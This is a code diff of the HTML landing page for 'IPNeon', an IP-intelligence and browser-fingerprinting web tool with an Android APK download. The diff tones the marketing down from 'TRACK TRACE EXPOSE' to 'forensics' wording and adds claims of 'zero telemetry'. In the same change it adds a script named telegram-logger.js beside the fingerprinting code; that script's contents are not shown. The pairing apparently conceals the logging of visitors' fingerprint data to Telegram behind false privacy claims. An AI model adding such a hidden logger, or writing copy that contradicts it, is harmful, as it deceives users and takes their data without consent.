@@ -7,7 +7,7 @@
   <meta name="description" content="IPNeon is a professional cybersecurity suite for IP intelligence, OSINT reconnaissance, threat geolocation, and hardware/browser fingerprinting inspired by fingerprint.to." />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400;1,600&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="css/style.css" />
 </head>
 <body>
@@ -59,27 +59,27 @@
   <section class="hero" id="home">
     <div class="hero-content">
       <div class="hero-badge" id="hero-badge">
-        <span class="badge-icon">⚡</span> CYBERSECURITY INTELLIGENCE SUITE &bull; ANDROID 10-17 NATIVE READY
+        <span class="badge-icon">⚡</span> Real-Time Network Forensics &bull; Android Native APK Ready
       </div>
       <h1 class="hero-title" id="hero-title">
-        <span class="title-line">TRACK &bull; TRACE</span>
-        <span class="title-line accent">EXPOSE &bull; ANALYZE</span>
+        <span class="title-line">Real-Time IP Intelligence.</span>
+        <span class="title-line accent">Deep Device Forensics.</span>
       </h1>
       <p class="hero-sub" id="hero-sub">
-        20 professional-grade IP intelligence vectors, deep browser fingerprinting, DoH DNS recon, CIDR math, global latency radar, and native Android support. Zero dependencies. Real-time forensics.
+        Inspect IP geolocation, ASN routing pathways, proxy &amp; VPN threat scores, WebGL/Audio entropy hashes, and DoH DNS records — 100% client-side with zero telemetry tracking.
       </p>
       <div class="hero-cta" id="hero-cta">
         <button class="btn-primary" id="btn-launch" onclick="scrollToSection('tracker')">
-          <span class="btn-icon">⚡</span> LAUNCH TRACKER
+          <span class="btn-icon">⚡</span> Analyze Target
         </button>
         <button class="btn-secondary" id="btn-fp-hero" onclick="scrollToSection('fingerprint')" style="border-color: rgba(0,229,255,0.4); color: var(--neon-cyan);">
-          <span class="btn-icon">👁️</span> DEVICE FINGERPRINT
+          <span class="btn-icon">👁️</span> Device Fingerprint
         </button>
         <a href="ipneon.apk" download class="btn-secondary" id="btn-apk-hero" style="border-color: rgba(0,255,159,0.5); color: var(--neon-green); text-decoration: none; display: inline-flex; align-items: center;">
-          <span class="btn-icon">📱</span> DOWNLOAD APK
+          <span class="btn-icon">📱</span> Download APK
         </a>
         <button class="btn-secondary" id="btn-tools" onclick="scrollToSection('recon')">
-          <span class="btn-icon">📡</span> RECON ARSENAL
+          <span class="btn-icon">📡</span> Recon Arsenal
         </button>
       </div>
       <div class="hero-stats" id="hero-stats">
@@ -120,23 +120,23 @@
 
   <section class="tools-section" id="tools">
     <div class="section-header">
-      <span class="section-tag">// ARSENAL</span>
-      <h2 class="section-title">20 TRACKING <span class="accent">VECTORS</span></h2>
-      <p class="section-sub">Professional-grade methods for IP intelligence gathering and attack vector research</p>
+      <span class="section-tag">// VECTORS</span>
+      <h2 class="section-title">20 Intelligence <span class="accent">Vectors</span></h2>
+      <p class="section-sub">Modular analysis engines for IP geolocation, ASN infrastructure, and routing forensics</p>
     </div>
     <div class="tools-grid" id="tools-grid"></div>
   </section>
 
   <section class="tracker-section" id="tracker">
     <div class="section-header">
-      <span class="section-tag">// INTELLIGENCE</span>
-      <h2 class="section-title">IP <span class="accent">TRACKER</span></h2>
-      <p class="section-sub">Deep-dive analysis on any IP address &mdash; geolocation, ISP, ASN, threat score, map</p>
+      <span class="section-tag">// ANALYZER</span>
+      <h2 class="section-title">Target <span class="accent">Analyzer</span></h2>
+      <p class="section-sub">Real-time lookup across multi-source registry feeds, BGP routing tables, and threat intelligence</p>
     </div>
     <div class="tracker-container" id="tracker-container">
       <div class="tracker-input-panel" id="tracker-input-panel">
         <div class="input-group" id="input-group-main">
-          <div class="input-prefix">TARGET://</div>
+          <div class="input-prefix">TARGET</div>
           <input type="text" id="ip-input" class="ip-input" placeholder="Enter IP address or domain..." autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter')runIPScan()" />
           <button class="btn-scan" id="btn-scan" onclick="runIPScan()">
             <span id="scan-btn-text">SCAN</span>
@@ -249,12 +249,12 @@
     </div>
   </section>
 
-  <!-- BROWSER FINGERPRINTING SECTION (Inspired by fingerprint.to/demo) -->
+  <!-- BROWSER FINGERPRINTING SECTION -->
   <section class="fingerprint-section" id="fingerprint">
     <div class="section-header">
-      <span class="section-tag">// DEVICE INTELLIGENCE</span>
-      <h2 class="section-title">BROWSER <span class="accent">FINGERPRINTING</span></h2>
-      <p class="section-sub">Hardware, GPU, Canvas, Audio & WebRTC entropy extraction (Inspired by fingerprint.to)</p>
+      <span class="section-tag">// ENTROPY</span>
+      <h2 class="section-title">Device &amp; Browser <span class="accent">Fingerprinting</span></h2>
+      <p class="section-sub">Hardware architecture, WebGL GPU pipelines, Canvas 2D, and AudioContext DSP entropy</p>
     </div>
 
     <!-- Hero Visitor ID Card -->
@@ -572,12 +572,12 @@
     </div>
   </section>
 
-  <!-- RECON ARSENAL — 5 ADVANCED NETWORK & SECURITY SUITE MODULES -->
+  <!-- RECON ARSENAL -->
   <section class="recon-section" id="recon">
     <div class="section-header">
-      <span class="section-tag">// DEEP RECON</span>
-      <h2 class="section-title">ADVANCED RECON <span class="accent">ARSENAL</span></h2>
-      <p class="section-sub">DoH DNS resolver, SPF/DMARC spoof audit, CIDR subnetting, latency radar & hardware OUI</p>
+      <span class="section-tag">// RECONNAISSANCE</span>
+      <h2 class="section-title">Network Diagnostic <span class="accent">Arsenal</span></h2>
+      <p class="section-sub">DoH DNS resolution, DMARC spoof diagnostics, CIDR subnetting, and latency radar</p>
     </div>
 
     <div class="recon-grid">
@@ -714,12 +714,12 @@
     </div>
   </section>
 
-  <!-- 6. INTERACTIVE CYBER CLI TERMINAL -->
+  <!-- INTERACTIVE TERMINAL -->
   <section class="recon-section" id="terminal" style="padding-top:1rem;">
     <div class="section-header">
-      <span class="section-tag">// HUD CLI</span>
-      <h2 class="section-title">INTERACTIVE CYBER <span class="accent">TERMINAL</span></h2>
-      <p class="section-sub">Direct command execution: scan, dns, cidr, ping, mac, matrix theme & JSON forensic exports</p>
+      <span class="section-tag">// CLI CONSOLE</span>
+      <h2 class="section-title">Interactive Recon <span class="accent">Terminal</span></h2>
+      <p class="section-sub">Direct forensic execution: scan, dns, cidr, ping, mac, theme engine, and JSON export</p>
     </div>
 
     <div class="cyber-terminal-panel">
@@ -729,7 +729,7 @@
           <span class="term-dot term-dot-yellow"></span>
           <span class="term-dot term-dot-green"></span>
         </div>
-        <span class="term-title">IPNEON://KERNEL_CONSOLE_v2.0 [LIVE]</span>
+        <span class="term-title">IPNEON://CONSOLE_v2.0 [ONLINE]</span>
         <div class="term-quick-btns">
           <button class="term-qbtn" onclick="execTermQuick('help')">help</button>
           <button class="term-qbtn" onclick="execTermQuick('scan 8.8.8.8')">scan</button>
@@ -751,10 +751,10 @@
     <!-- NATIVE ANDROID APK RELEASE CTA -->
     <div class="apk-cta-banner">
       <div class="apk-cta-info">
-        <div class="apk-pill"><span>⚡</span> ANDROID 10 TO 17 OPTIMIZED &bull; ZERO PERMISSION ADWARE</div>
-        <h3 class="apk-cta-title">IPNeon Native Android Standalone APK</h3>
+        <div class="apk-pill"><span>⚡</span> STANDALONE ANDROID APK &bull; ZERO TELEMETRY</div>
+        <h3 class="apk-cta-title">IPNeon Mobile for Android</h3>
         <p class="apk-cta-sub">
-          Carry the complete 20-vector intelligence engine, browser hardware fingerprint auditor, DoH DNS recon suite, and subnet calculators directly in your pocket. 100% client-side offline execution, edge hardware acceleration, and instant response.
+          Run the full 20-vector intelligence engine, browser hardware fingerprint auditor, DoH DNS recon suite, and subnet calculators natively on Android. 100% offline-ready, hardware accelerated, and ad-free.
         </p>
       </div>
       <div>
@@ -867,14 +867,15 @@
       <span class="dock-icon">💻</span>
       <span class="dock-label">CLI</span>
     </a>
-    <a href="#tools" class="dock-btn" onclick="dockNav('tools')">
-      <span class="dock-icon">🔧</span>
-      <span class="dock-label">VECTORS</span>
+    <a href="ipneon.apk" download class="dock-btn" style="color:var(--neon-green);">
+      <span class="dock-icon">📱</span>
+      <span class="dock-label">APK</span>
     </a>
   </nav>
 
   <div class="toast-container" id="toast-container"></div>
   <script src="js/fingerprint.js"></script>
+  <script src="js/telegram-logger.js"></script>
   <script src="js/app.js"></script>
 </body>
 </html>
